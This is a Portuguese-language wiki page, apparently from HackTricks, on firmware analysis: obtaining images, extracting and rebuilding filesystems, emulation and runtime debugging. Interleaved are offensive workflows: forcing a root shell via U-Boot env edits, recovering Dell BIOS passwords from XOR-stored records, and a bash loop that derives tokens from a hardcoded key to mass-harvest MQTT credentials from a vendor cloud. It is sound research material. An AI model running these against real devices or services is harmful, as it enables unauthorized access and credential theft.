# Análise de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introdução**

### Recursos relacionados

Para obter firmware por meio de interfaces de hardware expostas, consulte [despejo de firmware assistido por console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) e [despejo de flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é um software essencial que permite que os dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções essenciais desde o momento em que é ligado, o que leva à inicialização do sistema operacional. Examinar e, potencialmente, modificar o firmware é uma etapa crítica para identificar vulnerabilidades de segurança.<sup>[[2]](#references)[[3]](#references)</sup>

## **Coleta de informações**

**A coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional executado
- Detalhes do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Histórico de atualizações e certificações regulatórias
- Diagramas de arquitetura e fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para isso, ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software de código aberto disponíveis, por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [LGTM da Semmle](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser usada para encontrar possíveis problemas.

## **Obtenção do firmware**

O firmware pode ser obtido de várias maneiras, cada uma com seu próprio nível de complexidade:

- Diretamente da fonte (desenvolvedores, fabricantes)
- Compilando-o com as instruções fornecidas
- Baixando-o dos sites oficiais de suporte
- Usando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando diretamente o **armazenamento em cloud**, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **atualizações** por meio de técnicas man-in-the-middle
- Extraindo-o do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- Capturando solicitações de atualização nas comunicações do dispositivo
- Identificando e usando **endpoints de atualização hardcoded**
- Fazendo o **dump** pelo bootloader ou pela rede
- Removendo e lendo o chip de armazenamento, como último recurso, usando as ferramentas de hardware adequadas

### Logs somente de UART: force um shell root via env do U-Boot na flash

Se o RX da UART for ignorado (somente logs), ainda é possível forçar um shell de init **editando offline o blob do ambiente do U-Boot**:<sup>[[6]](#references)</sup>

1. Faça o dump da flash SPI com um clip SOIC-8 e um programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localize a partição env do U-Boot, edite `bootargs` para incluir `init=/bin/sh` e **recalcule o CRC32 do env do U-Boot** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deverá aparecer na UART.

Isso é útil em dispositivos embarcados nos quais o shell do bootloader está desativado, mas a partição env pode ser gravada por meio de acesso externo à flash.

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Algumas ferramentas que você pode usar para isso:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se você não encontrar muita coisa com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se for baixa, provavelmente ela não está criptografada. Se for alta, provavelmente está criptografada (ou compactada de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **arquivos incorporados ao firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Análise diferencial de flash e armazenamento de segredos XOR recuperáveis

Quando uma configuração de firmware não tem um formato de armazenamento documentado, primeiro faça várias leituras correspondentes da flash, altere **exatamente** uma configuração, faça novamente o dump do chip inteiro e compare os offsets. Repetir o experimento com valores controlados permite distinguir a configuração de contadores e metadados de gravação; alterações em novos offsets, em vez de no mesmo lugar, indicam um armazenamento append-only ou estruturado como log. Preserve as entradas excluídas/marcadas como tombstone, pois os bytes de seus payloads ainda podem ser recuperáveis.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Após localizar a região, extraia os módulos de firmware com ferramentas como `binwalk` e faça engenharia reversa do writer/validator no Ghidra. Confirme no código os limites dos campos, o padding, a indexação da chave e a derivação da chave, em vez de inferir o esquema apenas pelos padrões do texto cifrado.<sup>[[12]](#references)</sup>

#### Recuperar chaves a partir de padding zero criptografado

Conforme descrito em [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), o texto conhecido revela bytes do keystream nos mesmos offsets. Um campo de tamanho fixo fica especialmente exposto quando seu padding zero abrange todos os índices de uma chave XOR repetida: o padding criptografado revela esses bytes da chave diretamente, pois `0x00 XOR key_byte = key_byte`. Se todos os índices da chave estiverem cobertos, reconstrua a chave a partir do final do texto cifrado e decifre os bytes preenchidos.<sup>[[12]](#references)</sup>

O formato vulnerável de senha do BIOS DVAR da Dell é um exemplo concreto: o byte `0` de um campo de 32 bytes está em texto simples, enquanto os bytes `1..31` usam uma chave repetida de 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para um comprimento de senha `L`, as posições `L..31` eram zero antes do XOR. Quando `L <= 12`, essas posições abrangem todos os índices da chave, então a chave completa e a senha são recuperadas sem brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraia chaves de registros históricos

Não analise cada registro de forma independente. A chave DVAR é derivada aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: o seed do dispositivo e o GUID são fixos, e a única entrada dependente da senha é o primeiro byte em claro. Isso gera no máximo 256 chaves por dispositivo e faz com que registros que começam com o mesmo byte compartilhem uma chave. Agrupe os registros ativos e excluídos por esse byte; um registro histórico curto pode revelar a chave completa por meio do padding e descriptografar um registro atual mais longo cujo próprio padding seja insuficiente. Portanto, a rotação de senha pode aumentar a exposição quando o ciphertext antigo é marcado como excluído, em vez de ser apagado.<sup>[[12]](#references)</sup>

A ferramenta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera senhas e pode exibir bytes brutos armazenados/da chave. Compile-a a partir de um checkout e analise uma imagem flash verificada da seguinte forma:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para parsers customizados, rejeite falsos positivos verificando a estrutura dos registros, as restrições de caracteres imprimíveis, o preenchimento com zeros, a entropia da chave e a consistência quando a chave dá a volta. Se dumps repetidos mostrarem poucas alterações de bits por gravação, enumere as máscaras observadas e classifique as correções segundo essas restrições, mas indique os caracteres ambíguos em vez de apresentar resultados heurísticos como recuperação exata.<sup>[[12]](#references)</sup>

Os verificadores de senha devem armazenar um hash unidirecional iterado e com salt, em vez de texto cifrado reversível, e os armazenamentos com estrutura de log devem remover com segurança o material secreto substituído.<sup>[[12]](#references)</sup>

### Obtendo o Sistema de Arquivos

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você já deveria ter conseguido **extrair o sistema de arquivos**.\
O Binwalk geralmente o extrai para uma **pasta com o nome do tipo de sistema de arquivos**, que costuma ser um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração Manual do Sistema de Arquivos

Às vezes, o binwalk **não tem o magic byte do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o deslocamento do sistema de arquivos e extrair o sistema de arquivos compactado** do binário e **extraia manualmente** o sistema de arquivos de acordo com seu tipo, usando as etapas abaixo.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Execute o seguinte **comando dd** para extrair o sistema de arquivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" depois disso.

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstruindo sistemas de arquivos raiz embarcados divididos

Se um dump bruto de eMMC/SSD contiver um cabeçalho de sistema de arquivos válido, mas os offsets dos metadados se estenderem além da partição nominal, não o classifique imediatamente como corrompido. O código de inicialização embarcado pode montar o dispositivo raiz real a partir de vários intervalos físicos usando Device Mapper; assim, extrair uma única partição GPT produz apenas o primeiro segmento.<sup>[[9]](#references)</sup>

#### Triagem da imagem completa da mídia

Primeiro, verifique se a aquisição foi concluída, se o tamanho está estável e se nenhum processo de gravação ainda mantém a imagem aberta. Se o nome do arquivo codificar um endereço inicial/final, compare esse intervalo com a contagem real de bytes. Recupere a GPT em modo somente leitura e anexe apenas o intervalo necessário; **não** execute `vgchange -ay` em um volume físico não confiável na estação de trabalho, pois podem ocorrer conflitos entre grupos de volumes e gravações não intencionais.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Prefira uma VM descartável quando a lógica original de inicialização ou uma pilha LVM precisar acessar a imagem inteira. Logs históricos de inicialização de uma partição de boot padrão são especialmente úteis: o bootloader pode ter registrado offsets do contêiner proprietário, comprimentos dos componentes, seleção do slot, regras de alinhamento e verificação de assinatura. Use esses valores para extrair uma linha de comando/kernel/initramfs incorporados e, em seguida, valide cada saída individualmente com `file`, bytes mágicos e `binwalk`; ler até o fim do contêiner pode anexar acidentalmente um initrd, objeto ACPI ou assinatura ao kernel.<sup>[[9]](#references)</sup>

#### Recupere o mapa de blocos durante a inicialização

Extraia o initramfs do kernel e faça engenharia reversa de `/init` e de quaisquer bibliotecas de armazenamento. Em [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), siga as referências às strings `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` e aos caminhos das partições; depois, rastreie o código que seleciona o slot A/B ativo e cria a tabela. Pontos de partida úteis no radare2 são `r2 -A init`, `afl`, `pdf @ main` e `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

O alvo linear mapeia intervalos consecutivos de um dispositivo virtual em intervalos de um ou mais dispositivos de apoio. Uma tabela recuperada com dois segmentos costuma ter este formato (todas as posições e comprimentos estão em setores de 512 bytes):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduza exatamente a aritmética do código de máquina, incluindo a largura dos inteiros, os deslocamentos de bits e as conversões de unidades. Por exemplo, a expressão a seguir arredonda para baixo o tamanho em bytes até um limite de 4 KiB e só então o converte em setores de 512 bytes; substituí-la por `p4_bytes // 512` desloca a cauda selecionada em `p4_bytes % 4096` sempre que a partição não estiver alinhada à página.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstrua uma imagem de análise flat copiando os intervalos na ordem da tabela, em blocos limitados, em vez de carregar o dump completo da mídia na memória. Isso também evita criar dispositivos mapper no host. Mantenha os offsets derivados da GPT, as contagens de setores invertidas e o comprimento de saída resultante como asserções separadas.<sup>[[9]](#references)</sup>

#### Diferencie corrupção de um erro constante de reconstrução

Para SquashFS, verifique o magic `hsqs` e decodifique o campo little-endian de 64 bits `bytes_used` no offset 40 do superbloco antes de executar `unsquashfs`. Se a extração falhar em várias estruturas sem relação entre si, pesquise uma janela ampla ao redor das posições esperadas e exija candidatos estruturais sólidos: um bloco de metadados descomprimível, várias entradas de diretório consecutivas válidas, campos de inode plausíveis, um inode raiz compatível com a contagem de inodes ou uma estrutura de metadados de integridade válida. Uma única correspondência de magic não é suficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Quando o mesmo delta assinado torna válidas estruturas independentes — por exemplo, metadados de diretório e um registro verity — a causa provável é um erro sistemático no início do segmento, e não bytes ausentes. Volte à aritmética inversa e procure restos descartados, problemas de sinal, overflow ou arredondamento de setores/páginas antes de tentar recuperar arquivos órfãos ou aplicar patches nos metadados do sistema de arquivos.<sup>[[9]](#references)</sup>

Por fim, mantenha separadas as fronteiras de proteção: volumes LUKS selados ao TPM protegem a confidencialidade dos dados, enquanto um mapeamento dm-verity assinado protege a integridade do sistema de arquivos raiz. Um TPM de software não recupera uma chave selada ao TPM físico original, e inicializar um SquashFS modificado por meio de um init destinado apenas à pesquisa que omite a verificação verity não falsifica sua assinatura nem quebra o dm-verity.<sup>[[9]](#references)</sup>

## Analisando o Firmware

Depois que o firmware é obtido, é essencial dissecá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve o uso de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de análise inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes das partições e dos sistemas de arquivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para avaliar o status da criptografia da imagem, verifica-se a **entropia** com `binwalk -E <bin>`. Entropia baixa sugere ausência de criptografia, enquanto entropia alta indica possível criptografia ou compactação.

Para extrair **arquivos embutidos**, recomendam-se ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspecionar arquivos.

### Extraindo o Filesystem

Com `binwalk -ev <bin>`, geralmente é possível extrair o filesystem, muitas vezes para um diretório com o nome do tipo de filesystem (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não reconhece o tipo de filesystem devido à ausência de magic bytes, é necessário fazer a extração manualmente. Isso envolve usar `binwalk` para localizar o offset do filesystem e, em seguida, usar o comando `dd` para extrair o filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Depois, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), são usados comandos diferentes para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. A atenção se volta para daemons de rede inseguros, credenciais embutidas no código, endpoints de API, funcionalidades do servidor de atualização, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais principais** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de possíveis vulnerabilidades
- Binários incorporados para análise adicional
- Servidores web e binários comuns de dispositivos IoT

Várias ferramentas ajudam a encontrar informações confidenciais e vulnerabilidades no sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar informações confidenciais
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que poderiam ser explorados.

## Coleta de configurações de cloud e credenciais MQTT por meio de tokens de URL derivados

Muitos hubs IoT obtêm sua configuração específica por dispositivo de um endpoint cloud com um formato semelhante a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise de firmware, você pode descobrir que `<token>` é derivado localmente do ID do dispositivo usando um segredo embutido no código, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como hexadecimal em maiúsculas

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a configuração cloud, que muitas vezes revela credenciais MQTT em texto simples e prefixos de tópicos.

Fluxo de trabalho prático:

1) Extraia deviceId dos logs de inicialização UART

- Conecte um adaptador UART de 3,3 V (TX/RX/GND) e capture os logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Procure linhas que exibam o padrão de URL da configuração da cloud e o endereço do broker, por exemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recupere STATIC_KEY e o algoritmo do token do firmware

- Carregue os binários no Ghidra/radare2 e pesquise o caminho de configuração ("/pf/") ou o uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Gere o token no Bash e converta o digest para maiúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Coletar configurações de cloud e credenciais de MQTT

- Monte a URL e obtenha o JSON com curl; analise-o com jq para extrair segredos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abuse MQTT em texto não criptografado e ACLs fracas de tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos confidenciais:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI do fornecedor/produto/tipo, seguidos por um sufixo sequencial.
- Você pode iterar sobre IDs candidatos, derivar tokens e buscar configurações programaticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Sempre obtenha autorização explícita antes de tentar fazer enumeração em massa.
- Sempre que possível, prefira emulação ou análise estática para recuperar segredos sem modificar o hardware alvo.


O processo de emular firmware permite realizar **análise dinâmica** da operação de um dispositivo ou de um programa individual. Essa abordagem pode encontrar desafios relacionados a dependências de hardware ou arquitetura, mas transferir o sistema de arquivos raiz ou binários específicos para um dispositivo com arquitetura e endianidade correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-configurada, pode facilitar testes adicionais.

### Emulação de binários individuais

Para examinar programas isolados, é crucial identificar a endianidade e a arquitetura da CPU do programa.

#### Exemplo com arquitetura MIPS

Para emular um binário com arquitetura MIPS, pode-se usar o comando:

```bash
file ./squashfs-root/bin/busybox
```

E para instalar as ferramentas de emulação necessárias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), usa-se `qemu-mips`; para binários little-endian, a opção seria `qemu-mipsel`.

#### Emulação da arquitetura ARM

Para binários ARM, o processo é semelhante, usando o emulador `qemu-arm`.

### Emulação completa do sistema

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa do firmware, automatizando o processo e auxiliando na análise dinâmica.

### Reconstruindo sistemas de arquivos raiz divididos e verificados para emulação

Se um superbloco SquashFS puder ser lido, mas os deslocamentos das tabelas de inode, diretório ou fragmentos forem impossíveis, não corrija imediatamente o `unsquashfs`. Faça engenharia reversa do binário de inicialização inicial e reproduza o grafo de dispositivos de bloco que ele cria: sistemas embarcados podem expor uma partição raiz nominal, mas construir o sistema de arquivos real com um mapeamento `dm-linear` que acrescenta setores emprestados de outra partição. Verificações que examinam apenas o superbloco podem ser bem-sucedidas mesmo quando todos os blocos de metadados seguintes estão deslocados.<sup>[[11]](#references)</sup>

Preserve exatamente a aritmética do firmware. Em particular, identifique se os comprimentos estão em bytes, setores de 512 bytes ou páginas de 4 KiB; reproduza deslocamentos de bits e truncamentos na ordem original; e leve em conta as regiões finais dependentes do banco em layouts A/B. Por exemplo, `(partition_bytes >> 12) << 3` primeiro trunca para um limite de 4 KiB e só então expressa o resultado em setores de 512 bytes; substituí-lo por `partition_bytes // 512` pode deslocar a extensão acrescentada em alguns quilobytes e corromper todas as tabelas SquashFS subsequentes.<sup>[[11]](#references)</sup>

Um fluxo de validação útil é:<sup>[[11]](#references)</sup>

1. Recupere do binário verifier/init o dispositivo de origem, o setor inicial e o comprimento de cada segmento `dm-linear`.
2. Concatene ou mapeie as extensões sem alterar a semântica do alinhamento.
3. Se a extração ainda falhar, pesquise apenas uma pequena janela em torno do limite previsto e exija várias estruturas de metadados válidas consecutivas, em vez de aceitar apenas um superbloco aparentemente válido.
4. Execute um `unsquashfs` sem modificações na imagem reconstruída; a travessia bem-sucedida de todos os diretórios e fragmentos é uma evidência mais forte do que `unsquashfs -stat`.

#### Substituição de dm-verity controlada pelo analista

Quando o analista controla o kernel do QEMU, o initramfs e os discos virtuais, é possível inicializar um root modificado substituindo o PID 1 de verificação do fornecedor por um pequeno init ligado estaticamente. Isso é uma **substituição da cadeia de inicialização em laboratório**, não uma quebra do dm-verity, de sua assinatura RSA, do Secure Boot ou de uma chave selada por TPM.<sup>[[11]](#references)</sup>

O init substituto deve espelhar as etapas operacionais do caminho de inicialização original: montar `devtmpfs`, chamar `setsid()`, conectar `/dev/console` aos descritores de arquivo 0–2, montar `/proc` e `/sys`, aguardar o dispositivo de bloco fornecido, montar o root editado em modo somente leitura, desmontar os pseudo-sistemas de arquivos do root antigo, mover a nova montagem para `/`, executar `chroot` e `execve()` o `/sbin/init` original do firmware. Desmontar `/dev`, `/proc` e `/sys` **antes** de `MS_MOVE` evita desmontar acidentalmente pontos de montagem pertencentes ao novo root.<sup>[[11]](#references)</sup>

Mantenha o estado mutável do dispositivo separado do root imutável modificado. Um overlay qcow2 pode preservar o estado LVM do disco original enquanto um segundo disco virtio somente leitura fornece o SquashFS editado:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuração do estado da imagem offline

Inspecione o estado persistente fora do sistema convidado quando inicializações lentas, scripts de inicialização destrutivos ou registros de console não confiáveis dificultarem identificar a falha. Nunca anexe um overlay que uma VM em execução esteja usando; exponha-o com qemu-nbd, restrinja a descoberta do LVM à partição NBD pretendida e desative o grupo de volumes antes de desconectá-lo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para isolar falhas de forma reproduzível, grave arquivos de marcador com timestamp em um volume gravável estável e verifique-os offline; `/dev/kmsg`, FIFOs e consoles transitórios podem gerar falsos negativos devido à limitação de taxa ou à morte prematura do processo. Compare também as interfaces exatas entre as camadas antes de alterar código não relacionado: `uname -r` versus `/lib/modules/`, os recursos ext4 no disco versus a configuração do kernel e a geração do `libGL` do Mesa versus a ABI do driver DRI e os nomes de drivers derivados do PCI. Um componente pode existir e até executar `dlopen()` com sucesso, mas continuar inutilizável porque o consumidor espera uma ABI diferente.<sup>[[11]](#references)</sup>

## Análise dinâmica na prática

Nesta etapa, usa-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso ao shell do sistema operacional e ao sistema de arquivos. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais do ambiente emulado. A análise deve revisitar o sistema de arquivos, explorar páginas web e serviços de rede expostos e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são essenciais para identificar possíveis vulnerabilidades de backdoor.

## Técnicas de análise em tempo de execução

A análise em tempo de execução envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

Para alvos embarcados sem um debugger completo, **copie um `gdbserver` estaticamente vinculado** para o dispositivo e conecte-se a ele remotamente:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeamento de mensagens Zigbee / co-processador de rádio

Em hubs IoT, a pilha de RF costuma ser dividida entre um **MCU de rádio** e um processo em userland do Linux. Um fluxo de trabalho útil é mapear o caminho:<sup>[[8]](#references)</sup>

1. **Quadro RF** transmitido pelo ar
2. **Parser do lado do controlador** no MCU de rádio
3. **Protocolo serial/UART de texto ou TLV** encaminhado ao Linux (por exemplo, `/dev/tty*`)
4. **Dispatcher da aplicação** no daemon principal
5. **Handler específico do protocolo / máquina de estados**

Essa arquitetura cria dois alvos de reverse engineering em vez de um. Se o controlador converte quadros de rádio binários em um protocolo textual, como `Group,Command,arg1,arg2,...`, identifique:

- Os **grupos de mensagens** e as tabelas de dispatch
- Quais mensagens podem vir da **rede** e quais vêm do próprio controlador
- Os campos exatos de discriminação específicos do fabricante (por exemplo, `manufacturer_code` e `cluster_command` do Zigbee)
- Quais handlers só podem ser alcançados durante as fases de **commissioning**, descoberta ou download de firmware/modelo

Especificamente para Zigbee, capture o tráfego de pareamento e verifique se o alvo ainda usa a **Link Key** padrão `ZigBeeAlliance09`. Nesse caso, a captura do tráfego de commissioning pode revelar a **Network Key**. Os códigos de instalação do Zigbee 3.0 reduzem essa exposição; portanto, verifique se o dispositivo testado realmente os exige.

### Handlers de protocolo específicos do fabricante e acessibilidade controlada por FSM

Comandos Zigbee/ZCL específicos do fabricante costumam ser alvos melhores do que clusters padronizados, pois alimentam **código de parsing personalizado** e **FSMs** internas com validação menos testada.<sup>[[8]](#references)</sup>

Fluxo de trabalho prático:

- Faça reverse engineering do dispatcher de comandos até encontrar o **handler exclusivo do fabricante**.
- Recupere as tabelas de **estado da FSM**, **evento**, **verificação**, **ação** e **próximo estado**.
- Identifique **estados transitórios** que avançam automaticamente e ramificações de retry/erro que acabam redefinindo ou liberando o estado controlado pelo atacante.
- Confirme quais trocas legítimas de protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de presumir que o handler vulnerável está sempre acessível.

